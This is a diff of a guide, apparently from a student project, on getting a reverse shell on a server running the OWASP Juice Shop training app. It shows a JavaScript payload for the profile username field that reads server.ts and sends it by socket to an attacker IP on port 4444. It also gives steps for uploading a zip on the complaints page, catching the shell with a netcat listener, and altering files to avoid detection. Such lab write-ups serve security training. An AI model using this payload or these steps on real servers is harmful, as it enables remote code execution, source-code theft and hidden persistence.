@@ -9,7 +9,7 @@ This is a guide on how to get a reverse shell on the server hosting the juice sh
 * To successfully attack the server without detection, it's crucial to discreetly alter specific files. We need to understand which files to modify and their contents, allowing us to hide our exploit effectively and make it difficult to discover.
 * During our project, we identified numerous vulnerabilities on the website, with a particularly significant one in the profile's username field. This vulnerability allows us to execute code on the server machine. Using this, we can run a command to list all directory contents ("ls") and send the output to a listening service.
 
-So, changing the username of a user in (URL) to :
+So, changing the username of a user in (`{SERVER_IP}:{PORT}/profile`) to :
 
 ```javascript
 const { exec } = require('child_process'); const net = require('net'); exec('cat server.ts', (err, stdout,stderr) => { const client = new net.Socket();client.connect(4444, 'IP_ADDRESS', () => {client.write(stdout);client.end();});});
@@ -62,7 +62,7 @@ if __name__ == '__main__':
 
 ```
 
-* Now, we just submit the zip file in the complaints page (URL)
+* Now, we just submit the zip file in the complaints page (`{SERVER_IP}:{PORT}/#/complain`)
 * We can open a terminal listening to the port defined: `nc -lnvp 4444`
 * After submitting, we need to wait until the server restarts.
 * Once it restart, we will get a shell on the server machine.
